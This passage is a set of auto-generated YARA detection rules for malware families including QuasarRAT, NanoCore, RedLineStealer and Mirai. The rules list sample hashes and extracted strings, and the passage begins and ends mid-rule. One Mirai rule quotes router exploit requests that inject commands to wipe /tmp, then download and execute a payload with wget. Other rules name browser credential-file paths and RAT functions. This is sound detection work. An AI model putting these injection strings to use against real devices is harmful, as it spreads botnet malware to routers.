      $s4 = "get_TotalGamesCompleted" fullword ascii /* score: '12.00'*/
      $s5 = "GetCompletionRate" fullword ascii /* score: '12.00'*/
      $s6 = "GetAverageCompletionTime" fullword ascii /* score: '12.00'*/
      $s7 = "get_CompletionTime" fullword ascii /* score: '12.00'*/
      $s8 = "get_CompletionTimes" fullword ascii /* score: '12.00'*/
      $s9 = "<GetAverageCompletionTime>b__32_0" fullword ascii /* score: '12.00'*/
      $s10 = "{0} - {1:mm\\:ss} - Score: {2}" fullword wide /* score: '12.00'*/
      $s11 = "Game Started - {0} Difficulty" fullword wide /* score: '12.00'*/
      $s12 = "Grid is valid - {0} cells remaining" fullword wide /* score: '12.00'*/
      $s13 = "tempScore" fullword ascii /* score: '11.00'*/
      $s14 = "SudokuStats_{0:yyyy-MM-dd}.csv" fullword wide /* score: '10.00'*/
      $s15 = "Error exporting statistics: " fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5f7a4e0c_NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_25 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5f7a4e0c.exe, NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8444a484.exe, PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_05c349cb.exe, PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_da0cb3ce.exe, QuasarRAT(signature)_492a5d3560401c2811de048088bf91d0(imphash).exe, QuasarRAT(signature)_8b4d0760d426c9138154c52a7dcc4339(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f7a4e0cc9f7ff68d7ce55c83e6e0690570a107387e63a5da59471971d8a3aeb"
      hash2 = "8444a4843eae3e67f6c5803b61bdae3e9e6312d6d7375dda0631efff88f28e46"
      hash3 = "a61e745286c1ec16822dd0d16795a028476c76c0007bfbcc81f8b12ba28ef483"
      hash4 = "05c349cb69886cc2cb74481b527376eba76ad16a98c6c5a2c5d42a9ff083fae2"
      hash5 = "da0cb3ce20b18d06d4bb6101c124b366dde585db8ce21ec42b413ca9d0d1b5e9"
      hash6 = "d369c2c5febce0ef6d1a5267058ba5644c63fd989639b8c50fb1209efa0e4e34"
      hash7 = "9f8b05f57597f6a61089e954ea1c2dfa24f1a4a72c5a2ff883a9fabb1203f658"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s8 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s9 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s10 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s13 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s14 = "$GETPASSWORD1:IDOK" fullword ascii /* score: '17.00'*/
      $s15 = "$GETPASSWORD1:IDC_PASSWORDENTER" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__e065bb2b_Mirai_signature__e1770938_Mirai_signature__f8e04c2f_Mirai_signature__fd9ad44c_26 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e065bb2b.elf, Mirai(signature)_e1770938.elf, Mirai(signature)_f8e04c2f.elf, Mirai(signature)_fd9ad44c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e065bb2b55e0c3ead91fb2283f03929ab5c3100b708404c77629e883f4404874"
      hash2 = "e177093844fcc3fd6fcb545fcc160c8f017fefc3d39a21ad62cb36ae58cbd076"
      hash3 = "f8e04c2f5b67b4e6f646de31b2ff4120456467b0ee305b322ef622b7b0c99a7f"
      hash4 = "fd9ad44cd9d860d00e1c08a0f2dde2687215e9fc86c1ac5b5d1369505752d6af"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s5 = "deexec" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s7 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s8 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s9 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s10 = "scanspc" fullword ascii /* score: '9.00'*/
      $s11 = "scanmips" fullword ascii /* score: '9.00'*/
      $s12 = "scanppc" fullword ascii /* score: '9.00'*/
      $s13 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s14 = "boatnetz" fullword ascii /* score: '8.00'*/
      $s15 = "zxcfhuio" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___27 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12bc2271.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd24e53f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "12bc2271f1028192e643c23aea3eb3d802dd24d03ece51f62db4dd0c81e7aff2"
      hash3 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash4 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
      hash5 = "dd24e53f878c083f08795e1482ee67c971b80b27264ea6d30adafeaaa9ae27df"
   strings:
      $s1 = "GetKeyloggerLogsResponse" fullword ascii /* score: '22.00'*/
      $s2 = "GetKeyloggerLogs" fullword ascii /* score: '22.00'*/
      $s3 = "get_IsMouseKeyDown" fullword ascii /* score: '12.00'*/
      $s4 = "GetGenReader" fullword ascii /* score: '12.00'*/
      $s5 = "get_IsMouseKeyUp" fullword ascii /* score: '12.00'*/
      $s6 = "GetReaderPrimitive" fullword ascii /* score: '12.00'*/
      $s7 = "GetReaderMethodInfo" fullword ascii /* score: '12.00'*/
      $s8 = "remotepath" fullword ascii /* score: '11.00'*/
      $s9 = "systeminfos" fullword ascii /* score: '11.00'*/
      $s10 = "DoDownloadFile" fullword ascii /* score: '10.00'*/
      $s11 = "DoDownloadFileResponse" fullword ascii /* score: '10.00'*/
      $s12 = "{0}>> Session unexpectedly closed{0}" fullword wide /* score: '10.00'*/
      $s13 = "http://freegeoip.net/xml/" fullword wide /* score: '10.00'*/
      $s14 = "http://api.ipify.org/" fullword wide /* score: '10.00'*/
      $s15 = "get_SerializerSwitchMethodInfo" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e2bd07c2_Mirai_signature__e537e1d6_Mirai_signature__e5820391_Mirai_signature__e6fc7806_Mirai_signature__e9_28 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_e5820391.elf, Mirai(signature)_e6fc7806.elf, Mirai(signature)_e98a982a.elf, Mirai(signature)_f21b61ed.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash2 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash3 = "e5820391ace17fd7401509a07806c03cc40c3bdc05633bb5c671b6dc79738278"
      hash4 = "e6fc780670665fe812753a9cfc8813d1dca9f568b41c429623176f3b16dff4ac"
      hash5 = "e98a982a8ca994a9fb3689b60c8a5bb5ae3908644bdf592deb4578ca46e06318"
      hash6 = "f21b61eda803995cf980b9a897e36d91aedb430f2b07258ee2efbb466105eb1f"
      hash7 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s6 = "getsockopt.c" fullword ascii /* score: '9.00'*/
      $s7 = "_Unwind_VRS_Get" fullword ascii /* score: '9.00'*/
      $s8 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s9 = "attack_get_opt_str" fullword ascii /* score: '9.00'*/
      $s10 = "fnstart" fullword ascii /* score: '8.00'*/
      $s11 = "fnoffset" fullword ascii /* score: '8.00'*/
      $s12 = "bitpattern" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e2bd07c2_Mirai_signature__e537e1d6_Mirai_signature__fcdd1016_29 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash2 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash3 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "__pthread_mutex_unlock_full" fullword ascii /* score: '18.00'*/
      $s2 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_destroy.c" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s7 = "attack_bypass.c" fullword ascii /* score: '15.00'*/
      $s8 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s9 = "read_encoded_value" fullword ascii /* score: '12.00'*/
      $s10 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s11 = "user_agents" fullword ascii /* score: '12.00'*/
      $s12 = "h2_user_agents" fullword ascii /* score: '12.00'*/
      $s13 = "h2_tls_user_agents" fullword ascii /* score: '12.00'*/
      $s14 = "read_encoded_value_with_base" fullword ascii /* score: '12.00'*/
      $s15 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__e2bd07c2_Mirai_signature__e537e1d6_Mirai_signature__e5820391_Mirai_signature__e64a7016_Mirai_signature__e6_30 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_e2bd07c2.elf, Mirai(signature)_e537e1d6.elf, Mirai(signature)_e5820391.elf, Mirai(signature)_e64a7016.elf, Mirai(signature)_e6fc7806.elf, Mirai(signature)_e724c031.elf, Mirai(signature)_e98a982a.elf, Mirai(signature)_f21b61ed.elf, Mirai(signature)_f39b67ff.elf, Mirai(signature)_f655d8f9.elf, Mirai(signature)_fa34cf14.elf, Mirai(signature)_fcdd1016.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2bd07c2449ba0135da0e239310cb157d3fc2106610133eb365dc6602b96893b"
      hash2 = "e537e1d64cf006e0b1cd2fcf26f8ac277a1c7ed4c481df2428006d3ea2cd5b02"
      hash3 = "e5820391ace17fd7401509a07806c03cc40c3bdc05633bb5c671b6dc79738278"
      hash4 = "e64a7016accf95f6c7ca9f60183d9f34e1dc47bf66f27889964bfd185f3afa97"
      hash5 = "e6fc780670665fe812753a9cfc8813d1dca9f568b41c429623176f3b16dff4ac"
      hash6 = "e724c0315b16e070a8408bd63678b363419b127313335303bd660c6333b490b3"
      hash7 = "e98a982a8ca994a9fb3689b60c8a5bb5ae3908644bdf592deb4578ca46e06318"
      hash8 = "f21b61eda803995cf980b9a897e36d91aedb430f2b07258ee2efbb466105eb1f"
      hash9 = "f39b67fff1f106fb1b4fa9beb386427c8e7eb010f306ad0445da70bffc855f2e"
      hash10 = "f655d8f958ac76b94b196b1e4db839cf75599f7f71f31cd92d3d60609f330521"
      hash11 = "fa34cf14bba7b0ef493975bfb844eba1971d9c2902b7cc3efded5e25d8c6d405"
      hash12 = "fcdd10162bcdf72f022da7e1883227f26eedead93d9f3e028d01cae38a00e2a3"
   strings:
      $s1 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s4 = "__GI_getc_unlocked" fullword ascii /* score: '9.00'*/
      $s5 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s6 = "__GI_tcgetattr" fullword ascii /* score: '9.00'*/
      $s7 = "geteuid.c" fullword ascii /* score: '9.00'*/
      $s8 = "__GI_gettimeofday" fullword ascii /* score: '9.00'*/
      $s9 = "getuid.c" fullword ascii /* score: '9.00'*/
      $s10 = "fgets_unlocked.c" fullword ascii /* score: '9.00'*/
      $s11 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s12 = "fgetc_unlocked.c" fullword ascii /* score: '9.00'*/
      $s13 = "fgets.c" fullword ascii /* score: '9.00'*/
      $s14 = "__GI_getegid" fullword ascii /* score: '9.00'*/
      $s15 = "fgetc_unlocked" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_31 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash3 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash4 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash5 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash6 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash7 = "91638b5c9331d91c57a3b55363a7f5c76082d9261a8cfefc34fd3923dcf32dd5"
      hash8 = "db728098ee83742156ca473750c72cc14ea5d249cb61a1168009eacbd880c1b3"
   strings:
      $s1 = "Attempt to process too many blocks" fullword wide /* score: '22.00'*/
      $s2 = "Opera Software\\Opera GX Stable\\Login Data" fullword wide /* score: '20.00'*/
      $s3 = "nonSecretPayloadLength" fullword ascii /* score: '16.00'*/
      $s4 = "ProcessAadByte" fullword ascii /* score: '15.00'*/
      $s5 = "ProcessBytes" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessAadBytes" fullword ascii /* score: '15.00'*/
      $s7 = "ProcessByte" fullword ascii /* score: '15.00'*/
      $s8 = "ProcessPartial" fullword ascii /* score: '15.00'*/
      $s9 = "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data" fullword wide /* score: '15.00'*/
      $s10 = "Microsoft\\Edge\\User Data\\Default\\Login Data" fullword wide /* score: '15.00'*/
      $s11 = "invalid parameter passed to AES init - " fullword wide /* score: '15.00'*/
      $s12 = "1ProtoBuf.ExtensibleUtil+<GetExtendedValues>d__0`1" fullword ascii /* score: '12.00'*/
      $s13 = "encrypted_key" fullword wide /* score: '12.00'*/
      $s14 = "HaveSameContents" fullword ascii /* score: '9.00'*/
      $s15 = "GetNextCtrBlock" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__f39b67ff_Mirai_signature__fa34cf14_32 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_f39b67ff.elf, Mirai(signature)_fa34cf14.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f39b67fff1f106fb1b4fa9beb386427c8e7eb010f306ad0445da70bffc855f2e"
      hash2 = "fa34cf14bba7b0ef493975bfb844eba1971d9c2902b7cc3efded5e25d8c6d405"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '42.00'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '41.00'*/
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '37.00'*/
      $x4 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii /* score: '34.00'*/
      $x5 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii /* score: '31.00'*/
      $x6 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/spim+-O+/tmp/netgear;sh+netgear&curpath=/&curr" ascii /* score: '31.00'*/
      $x7 = "ient>`cd /tmp/; rm -rf*; wget http://%s/spim`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing<" ascii /* score: '31.00'*/
      $x8 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/spim+-O+/tmp/netgear;sh+netgear&curpath=/&curr" ascii /* score: '31.00'*/
      $s9 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '30.00'*/
      $s10 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F" ascii /* score: '27.00'*/
      $s11 = " -g %s -l /tmp/huawei -r /spim;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownload" ascii /* score: '27.00'*/
      $s12 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s/l7vmra;chmod+777+l7vmra;/tmp/l7vmra" fullword ascii /* score: '27.00'*/
      $s13 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s/l7vmra;chmod+777+l7vmra;/tmp/l7vmra HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s14 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F" ascii /* score: '23.00'*/
      $s15 = "ient>`cd /tmp/;chmod +x spim;./spim`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortM" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _N_W_rm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash___33 {
   meta:
      description = "_subset_batch - from files N-W-rm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f3c0ed2.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d42ac4e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b9797f8cc8259275cbb727b5ec10068ea868838cd803381b7089ba97c8b1b7b"
      hash2 = "2f3c0ed245f51ba046dc425e32409890f029a235cf0cc4330c5088bc1465053d"
      hash3 = "d42ac4e3da7e1aa7ae41d0547c0cdcf1e30300fb2ea96cea42bb1d43a5000b27"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADi" fullword ascii /* score: '27.00'*/
      $s2 = "DoDownloadAndExecute" fullword ascii /* score: '22.00'*/
      $s3 = "\\msvcr100.dll" fullword wide /* score: '21.00'*/
      $s4 = "\\msvcp100.dll" fullword wide /* score: '21.00'*/
      $s5 = "\\msvcr120.dll" fullword wide /* score: '21.00'*/
      $s6 = "\\msvcp120.dll" fullword wide /* score: '21.00'*/
      $s7 = "\\mozglue.dll" fullword wide /* score: '21.00'*/
      $s8 = "get_Processname" fullword ascii /* score: '20.00'*/
      $s9 = "Execution failed: {0}" fullword wide /* score: '19.00'*/
      $s10 = "Execution failed!" fullword wide /* score: '19.00'*/
      $s11 = "DoUploadAndExecute" fullword ascii /* score: '18.00'*/
      $s12 = "System.Collections.Generic.IEnumerable<xClient.Core.MouseKeyHook.KeyPressEventArgsExt>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s13 = "Executed File!" fullword wide /* score: '18.00'*/
      $s14 = "get_LastUserStatus" fullword ascii /* score: '17.00'*/
      $s15 = "get_HostKey" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9ecc8f27_RedLineStealer_signature__f34d5f2d4577ed6d9cee_34 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9ecc8f27.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e8de398a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ecc8f27bafbc29819f09ba664ffbcfede6f25afb3449d53d41ce9ecfc29641a"
      hash2 = "e8de398ad0ec581f25871dded67f27a639515b89595f897fa00349f79af210a7"
   strings:
      $s1 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s2 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s3 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s4 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s5 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s6 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s7 = "GetHistoryStrings" fullword ascii /* score: '9.00'*/
      $s8 = "<Operand2>k__BackingField" fullword ascii /* score: '9.00'*/
      $s9 = "set_Operand2" fullword ascii /* score: '9.00'*/
      $s10 = "GetHistoryByDate" fullword ascii /* score: '9.00'*/
      $s11 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
      $s12 = "GetLastEntry" fullword ascii /* score: '9.00'*/
      $s13 = "set_Operand1" fullword ascii /* score: '9.00'*/
      $s14 = "CreateOperatorButtons" fullword ascii /* score: '9.00'*/
      $s15 = "CreateBasicOperatorButtons" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__074e6f0b_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_35 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_074e6f0b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ae8c502.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21ea4b39.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b14108c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_601331cb.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_650ca510.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67504a7c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b67447d.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87688590.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91638b5c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aa99c6f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6640f14.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4cc1820.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d017447f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_db728098.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074e6f0bbab42ec220ce7c74545986d8ba1a641eb1f8690ad0d90063b0529844"
      hash2 = "0ae8c5022567fc8588fdc2fbf27d1d245f7e9bb15a23cb8a01962be6b51cb73c"
      hash3 = "21ea4b39f79a9af056ffc368cc9e78abbddec1838885b00a4d7eaeeb306d8515"
      hash4 = "5b14108c4f7e043dd7e9a0f9a3793608bf5690ae37b4e624a06d10bfbc6e61c1"
      hash5 = "601331cb72752cbcc12488cbd5a679325dd2d76696e87f7c3195cba348f3d215"
      hash6 = "650ca51048cf80b76d0450b73b41a1e12b81d8c0f3288fe67204a0be985e1693"
      hash7 = "67504a7c1e834ec7a871393547f566e8e0d40b5a1bf1d63b6676345266dea1e9"
      hash8 = "6b67447d97fcaca79ed98bcd6461b06445e978be3d45d4b0e2637057da97c4c2"
